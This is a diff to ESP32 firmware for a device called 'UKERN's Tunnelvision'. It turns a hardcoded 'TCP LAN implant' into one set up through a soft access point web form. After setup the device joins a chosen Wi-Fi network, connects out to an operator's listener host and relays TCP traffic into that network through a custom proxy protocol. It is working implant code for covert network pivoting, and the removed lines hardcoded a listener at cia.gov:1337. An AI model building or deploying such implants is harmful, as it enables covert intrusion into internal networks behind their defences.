@@ -10,34 +10,62 @@
 #include <lwip/err.h>
 #include <lwip/sys.h>
 #include <netdb.h>
+#include <ESPmDNS.h>
 #include <fcntl.h>
-#include "config.h"
 
-const char* ssid = WLAN_SSID; // edit config.h
-const char* password = WLAN_PASS;  //edit config.h
+#define ESP32_SSID "Tunnelvision ☭"
+#define ESP32_KEY "133742069"
+#define ESP32_DOMAIN "tunnelvision"
 
-typedef enum {
-  PROXYPACKET_NOP = 0x00,
-  PROXYPACKET_AUTH = 0xA0,
-  PROXYPACKET_AUTHFAIL = 0xAF,
-  PROXYPACKET_DATA = 0xD0,
-  PROXYPACKET_ENDRESPONSE = 0xDE
-} ProxyPacketType;
+String html = 
+  "<!DOCTYPE html>"
+  "<html>"
+  "<head>"
+  "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
+  " <title>UKERN's Tunnelvision</title>"
+  " <style>*{background: #000; color: #149414;} html,body{font-family:'Courier New';}</style>"
+  "</head>"
+  "<body>"
+  " <center>"
+  "   <h1>UKERN's Tunnelvision</h1>"
+  "   <h2>Setup</h2>"
+  "   <form>"
+  "   <b>SSID: </b><input required name=\"SSID\" type=\"text\"/><br/>"
+  "   <b>KEY: </b><input name=\"KEY\" type=\"text\" minlength=\"8\"/><br/>"
+  "   <b>HOST: </b><input required name=\"HOST\" type=\"text\" maxlength=\"253\"/><br/>"
+  "   <b>PORT: </b><input required name=\"PORT\" type=\"number\"/><br/>"
+  "   <input name=\"submit\" type=\"submit\" value=\"connect\">"
+  "  </form>"
+  " </body>"
+  "</html>";
 
-typedef struct ProxyPacketHeader {
+WiFiServer server(80);
+const char* ssid = NULL;
+const char* password = NULL;
+const char* listenHost = NULL;
+uint16_t listenPort = 0;
+
+typedef uint8_t ProxyPacketType;
+const ProxyPacketType  PROXYPACKET_NOP = 0x00,
+PROXYPACKET_AUTH = 0xA0,
+PROXYPACKET_AUTHFAIL = 0xAF,
+PROXYPACKET_DATA = 0xD0,
+PROXYPACKET_ENDRESPONSE = 0xDE;
+
+typedef struct  ProxyPacketHeader {
   ProxyPacketType packetType;
-} ProxyPacketHeader_t;
+} __packed ProxyPacketHeader_t ;
 
 typedef struct ProxyPacketAuth {
   const char loginName[256];
   const char loginPassword[256];
-} ProxyPacketAuth_t;
+} __packed ProxyPacketAuth_t;
 
 typedef struct ProxyPacket {
   uint32_t packetLength;
   char domain[253];
   uint16_t port;
-} ProxyPacket_t;
+} __packed ProxyPacket_t;
 
 int createIPv4Socket(const char *domain, uint16_t port) {
 
@@ -46,28 +74,26 @@ int createIPv4Socket(const char *domain, uint16_t port) {
   struct hostent* ent = NULL;
   char IPv4Address[INET_ADDRSTRLEN];
 
-  Serial.println("Resolving DNS to IPv4...");
   if( !(ent = gethostbyname(domain)) ) {
-    Serial.printf("DNS resolution failed for %s\n", domain);
+    Serial.println("FAIL_RESOLVE_DNS");
     return -1;
   }
   
   if(ent->h_addrtype != AF_INET) {
-    Serial.printf("The domain %s uses IPv6 where IPv4 is required.\n", domain);
+    Serial.println("IPV6_UNSUPPORTED");
     return -1;
   }
 
   bcopy((struct sockaddr_in *) ent->h_addr_list[0], &sa.sin_addr, sizeof(struct sockaddr_in));
-
   inet_ntop(AF_INET, &(sa.sin_addr.s_addr), IPv4Address, INET_ADDRSTRLEN);
-  Serial.printf("DNS resolved: %s: %s\n", domain, IPv4Address);
   
   sa.sin_family = AF_INET;
   sa.sin_port = htons(port);
 
   fd = socket(AF_INET, SOCK_STREAM, 0);
   if(fd < 0) {
-    Serial.println("Failed to create socket.");
+    Serial.println("FAIL_SOCK_CREATE");
+    return -1;
   }
 
   struct timeval tv;
@@ -77,50 +103,48 @@ int createIPv4Socket(const char *domain, uint16_t port) {
 
   /* Connect to the server */
   int attempt = 0;
-  Serial.printf("Connecting to %s[%s]...\n", domain, IPv4Address);
   while (true) {
+    Serial.println("CONN_TCP");
     if( connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0 ) {
-      Serial.println("Failed to connect to server.");
+      Serial.print("FAIL_CONN_TCP: ");
+      Serial.println(domain);
       attempt++;
       if(attempt < 3) {
-        Serial.println("Retrying...");
         continue;
       }
       else {
-        Serial.printf("Failed to connect to %s[%s]: Maximum retries exceeded, giving up.\n", domain, IPv4Address);
+        Serial.print("FAIL_CONN_TCP_MAXRETRIES");
         close(fd);
         return -1;
       }
-      delay(5000); // Wait 5 seconds, then retry
     }
-    Serial.printf("Connected to %s[%s]:%d!\n", domain, IPv4Address, port);
     break;
   }
 
   return fd;
 }
 
-
-
 int receiveProxyAuthPacket(int sock) {
+
   ProxyPacketAuth_t auth = {};
   ssize_t nRead = read(sock, &auth, sizeof(ProxyPacketAuth_t));
 
+  Serial.println(auth.loginName);
+  Serial.println(auth.loginPassword);
+
   switch(nRead) {
     case -1:
-      Serial.println("An error occured receiving the proxy packet :(");
+      Serial.println("PROXY_AUTH_RECV_FAIL");
       return -1;
     case 0:
-      Serial.println("The socket has disconnected :(");
+      Serial.println("PROXY_AUTH_NODATA");
       return 0;
     
     default:
       if(nRead != sizeof(ProxyPacketAuth_t)) {
-        Serial.println("Received invalid Proxy Packet Header.");
+        Serial.println("PROXY_AUTH_INVALID");
         return -1;
       }
-      Serial.println("Received proxy auth packet!");
-      Serial.printf("Username = %s, Password = %s\n", auth.loginName, auth.loginPassword);
       break;
   } 
   return nRead;
@@ -130,176 +154,144 @@ int receiveProxyDataPacket(int sock) {
   ProxyPacket_t proxyPacket = {};
   ssize_t nRead = read(sock, &proxyPacket, sizeof(ProxyPacket_t));
 
-  switch(nRead) {
-    case -1:
-      Serial.println("An error occured receiving the proxy packet :(");
-      return -1;
-    case 0:
-      Serial.println("The socket has disconnected :(");
-      return 0;
-    
-    default:
-      if(nRead != sizeof(ProxyPacket_t)) {
-        Serial.println("Received invalid Proxy Packet Header.");
-        return -1;
-      }
-      Serial.println("Received proxy data packet!");
-      Serial.printf("domain = %s, port = %d\n", proxyPacket.domain, proxyPacket.port);
+  Serial.println(nRead);
 
-      int targetSock = createIPv4Socket(proxyPacket.domain, proxyPacket.port);
+  if(nRead == -1) {
+    Serial.println("Failed reading.");
+    return -1;
+  }
+  else if (nRead == 0) {
+    Serial.println("Read nothing");
+    return 0;
+  }
+  else if(nRead != sizeof(ProxyPacket_t)) {
+    Serial.println("Invalid proxypacket.");
+    return -1;
+  }
 
-      if(targetSock < 0) {
-        Serial.printf("Could not connect to: %s:%d\n", proxyPacket.domain, proxyPacket.port);
-        return -1;
-      }
+  Serial.println("CONN_TARGET");
+  int targetSock = createIPv4Socket(proxyPacket.domain, proxyPacket.port);
+  if(targetSock < 0) {
+    Serial.println("FAIL_CONN_TARGET");
+    return -1;
+  }
 
-      if(proxyPacket.packetLength) {
+  char buffer[256];
+  if(proxyPacket.packetLength) {
 
-        // Read small chunk
-        if(proxyPacket.packetLength < 256) {
-          char buffer[proxyPacket.packetLength];
-          nRead = read(sock, buffer, proxyPacket.packetLength);
-          Serial.printf("Received: \n");
-          for(int i = 0; i < proxyPacket.packetLength; i++) {
-            Serial.printf("%02x ", buffer[i]);
-          }
-          Serial.printf("\n\n");
+    // Read small chunk
+    if(proxyPacket.packetLength < 256) {
+      char buffer[proxyPacket.packetLength];
+      nRead = read(sock, buffer, proxyPacket.packetLength);
+      write(targetSock, buffer, nRead);
+      
+    }
+    else {
+      // Read large chunks
+      int len = proxyPacket.packetLength;
+      while(len > 0) {
+        if(len >= 256) {
+          nRead = read(sock, buffer, 256);
           write(targetSock, buffer, nRead);
-          
         }
         else {
-
-          // Read large chunks
-          char buffer[256];
-          int len = proxyPacket.packetLength;
-          while(len > 0) {
-            if(len >= 256) {
-              nRead = read(sock, buffer, 256);
-              Serial.printf("Received: \n");
-              for(int i = 0; i < 256; i+=4) {
-                Serial.printf("%c%c%c%c %02x %02x %02x %02x \n", buffer[i], buffer[i+1], buffer[i+2], buffer[i+3], buffer[i], buffer[i+1], buffer[i+2], buffer[i+3]);
-              }
-              Serial.printf("\n\n");
-              len -= 256;
-              write(targetSock, buffer, nRead);
-            }
-            else {
-              nRead = read(sock, buffer, len);
-              Serial.printf("Received: \n");
-              for(int i = 0; i < len; i++) {
-                Serial.printf("%c %02x \n", buffer[i],  buffer[i]);
-              }
-              write(targetSock, buffer, len);
-              Serial.printf("\n\n");
-              len = 0;
-            }
-          }
+          nRead = read(sock, buffer, len);
+          write(targetSock, buffer, len);
+          len = 0;
         }
-
-        char buffer[256];
-
-        Serial.println("Receiving response from target...\n");
-        ProxyPacketHeader_t hdr = {};
-        hdr.packetType = PROXYPACKET_DATA;
-
-        ProxyPacket_t responsePacket = {};
-        responsePacket.packetLength = 256;
-        responsePacket.port = proxyPacket.port;
-        memcpy(responsePacket.domain, proxyPacket.domain, sizeof(responsePacket.domain));
-
-        while( (nRead = read(targetSock, buffer, 256)) > 0)
-        {
-          Serial.printf("Got %d bytes from target...\n", nRead);
-          responsePacket.packetLength = nRead;
-          write(sock, &hdr, sizeof(ProxyPacketHeader_t));
-          write(sock, &responsePacket, sizeof(ProxyPacket_t));
-          write(sock, buffer, responsePacket.packetLength);
-          bzero(buffer, 256);
-        }
-
-        Serial.printf("Sending EOF packet..\n");
-        hdr.packetType = PROXYPACKET_ENDRESPONSE;
-        write(sock, &hdr, sizeof(ProxyPacketHeader_t));
       }
-      if(targetSock >= 0) {
-        close(targetSock);
-      }
-      
-      break;
-  } 
+    }
+    bzero(buffer, 256);
+
+    ProxyPacketHeader_t hdr = {};
+    hdr.packetType = PROXYPACKET_DATA;
+
+    ProxyPacket_t responsePacket = {};
+    responsePacket.packetLength = 256;
+    responsePacket.port = proxyPacket.port;
+    memcpy(responsePacket.domain, proxyPacket.domain, sizeof(responsePacket.domain));
+
+    while( (nRead = read(targetSock, buffer, 256)) > 0)
+    {
+      Serial.printf("RECV %d bytes...\n", nRead);
+      responsePacket.packetLength = nRead;
+      write(sock, &hdr, sizeof(ProxyPacketHeader_t));
+      write(sock, &responsePacket, sizeof(ProxyPacket_t));
+      write(sock, buffer, responsePacket.packetLength);
+      bzero(buffer, 256);
+    }
+
+    hdr.packetType = PROXYPACKET_ENDRESPONSE;
+    write(sock, &hdr, sizeof(ProxyPacketHeader_t));
+  }
+
+  if(targetSock >= 0) {
+    close(targetSock);
+  }
+    
   return nRead;
 }
 
-
-int receiveProxyPacket(int sock) {
+int8_t receiveProxyPacket(int sock) {
   
   ProxyPacketHeader_t hdr = {};
   ssize_t nRead = read(sock, &hdr, sizeof(ProxyPacketHeader_t));
 
   switch(nRead) {
     case -1:
-      Serial.println("An error occured receiving the proxy packet :(");
       return -1;
     case 0:
-      Serial.println("The socket has disconnected :(");
       return 0;
     
     default:
       if(nRead != sizeof(ProxyPacketHeader_t)) {
-        Serial.println("Received invalid Proxy Packet Header.");
         return -1;
       }
-      Serial.println("Received proxy packet header!");
       break;
   } 
 
   switch(hdr.packetType) {
 
     case PROXYPACKET_NOP:
-      Serial.println("Received null-operation packet.");
+    Serial.println("RECV_NOP");
       break;
 
     case PROXYPACKET_AUTH:
-      Serial.println("Received authentication packet.");
       nRead = receiveProxyAuthPacket(sock);
+      Serial.println("RECV_AUTH");
       break;
 
     case PROXYPACKET_DATA:
-      Serial.println("Received data packet.");
       nRead = receiveProxyDataPacket(sock);
+      Serial.println("RECV_DATA");
       break;
 
     default:
-      Serial.printf("Received invalid packet, type=%d", hdr.packetType);
+      Serial.printf("RECV_INVALID, type=%d", hdr.packetType);
       break;
   }
   return nRead;
 }
 
 
-int runTCPLANImplant(const char* listenerDomain, uint16_t listenerPort)
+void runTCPLANImplant(const char* listenerDomain, uint16_t listenerPort)
 {
   int listenerSock = -1;
-  
+
+  Serial.println("CONN_LISTENER");
   listenerSock = createIPv4Socket(listenerDomain, listenerPort);
   if(listenerSock < 0) {
-    Serial.println("Failed to create socket for listener server.");
-    return -1;
+    return;
   }
 
+  Serial.println("RECV_FROM_LISTENER");
   while(true) {
-    int rc = receiveProxyPacket(listenerSock);
-    if( rc == -1) {
+    const int8_t rc = receiveProxyPacket(listenerSock);
+    if(rc == -1 || rc == 0) {
       close(listenerSock);
-      return -1;
-    }
-    else if( rc == 0) {
-      close(listenerSock);
-      return 0;
+      return;
     }
   }
-
-  return 1;
 }
 
 void setup() {
@@ -308,34 +300,123 @@ void setup() {
   while(!Serial){}
   Serial.begin(9600);
 
-  // Wait for Wi-Fi connectivity 
-  WiFi.begin(ssid, password);
 
-  while (WiFi.status() != WL_CONNECTED) {
-    delay(500);
-    Serial.println("Connecting to WiFi..");
-  }
+  // Initialize Wi-Fi accesspoint
+  Serial.println("INIT_AP.");
+  WiFi.softAP(ESP32_SSID, ESP32_KEY);
   
+  // Retrieve ESP's gateway IP
+  IPAddress ESP32_IP = WiFi.softAPIP();
+  Serial.print("IP: ");
+  Serial.println(ESP32_IP);
+  
+  // Start the HTTP server
+  server.begin();
+
+  // Try to setup mDNS name
+  bool MDNSStatus = MDNS.begin(ESP32_DOMAIN);
+  if (MDNSStatus) {
+    MDNS.addService("http", "tcp", 80);
+    Serial.print("DOMAIN: ");
+    Serial.println(ESP32_DOMAIN);
+  }
 }
 
-int errorCount = 0;
+/* finds the needle in the haystack and returns it */
+String midString(String str, String start, String finish){
+  int locStart = str.indexOf(start);
+  if (locStart==-1) return "";
+  locStart += start.length();
+  int locFinish = str.indexOf(finish, locStart);
+  if (locFinish==-1) return "";
+  return str.substring(locStart, locFinish);
+}
 
 void loop() {
-  Serial.println("Starting TCP tunnel.\n");
-  int err = runTCPLANImplant("cia.gov", 1337);
-  if(err == -1) {
-    errorCount++;
-  }
-  else {
-    errorCount = 0;
-  }
 
-  if(errorCount > 10) {
-    Serial.printf("Tried to many times. A hero has died on the battlefield :(\n");
-    while(true){
-      delay(100);
+  // Wait for available clients
+  WiFiClient client = server.available();
+
+  if(client)
+  {
+    
+    // Receive data from client
+    Serial.println("WEBSRV_CLIENT: "+client.remoteIP().toString());
+    String request = client.readStringUntil('\r');
+    String response = "";
+
+    // Print out the request
+    Serial.println(request);
+
+    // Write HTTP header to client
+    client.println("HTTP/1.1 200 OK");
+    client.println("Content-type: text/html");
+    client.println("Connection: close");
+    client.println("Server: UKERN-TUNNELVISION v1.0");
+    client.println();
+
+
+    /* 
+      Parse the response from the client
+    */
+    if(request.indexOf("SSID=") != -1) {
+      ssid = strdup(midString(request, "SSID=", "&").c_str());
+      response += "<b>SSID_OK</b><br/>";
     }
-  }
+    if(request.indexOf("KEY=") != -1) {
+      password = strdup(midString(request, "KEY=", "&").c_str());
+      response += "<b>KEY_OK</b><br/>";
+    }
+    if(request.indexOf("HOST=") != -1) {
+      listenHost = strdup(midString(request, "HOST=", "&").c_str());
+      response += "<b>HOST_OK</b><br/>";
+    }
+    if(request.indexOf("PORT=") != -1) {
+      char *_port = strdup(midString(request, "PORT=", "&").c_str());
+      listenPort = (uint16_t)atoi(_port);
+      response += "<b>PORT_OK</b><br/>";
+    }
 
-  delay(10000);
+    if(listenPort && listenHost && ssid){
+      response += "<b>SETUP_COMPLETE</b><br/>";
+    }
+
+    client.print(html+response);
+
+    if(ssid != NULL && listenHost != NULL && listenPort != 0) {
+      Serial.print("WNET ");
+      Serial.print(ssid);
+      Serial.print(" FORWARD TO ");
+      Serial.print(listenHost);
+      Serial.print(":");
+      Serial.println(listenPort);
+      WiFi.begin(ssid, password);
+      int count = 0;
+      while(WiFi.status() != WL_CONNECTED)
+      {
+        delay(500);
+        Serial.print("WLAN_CONN_RETRY");
+        count++;
+        if(count == 10)
+        {
+          Serial.print("MAX_RETRY_EXCEEDED");
+          ssid = NULL;
+          password = NULL;
+          listenPort = 0;
+          listenHost = NULL;
+          return;
+        }
+      }
+      Serial.println("WLAN_CONNECTED");
+      Serial.print("IP: ");
+      Serial.print(WiFi.localIP());
+      Serial.print(" MAC: ");
+      Serial.println(WiFi.BSSIDstr());
+
+      runTCPLANImplant(listenHost, listenPort);
+
+    }
+    request="";
+    response = "";
+  }
 }
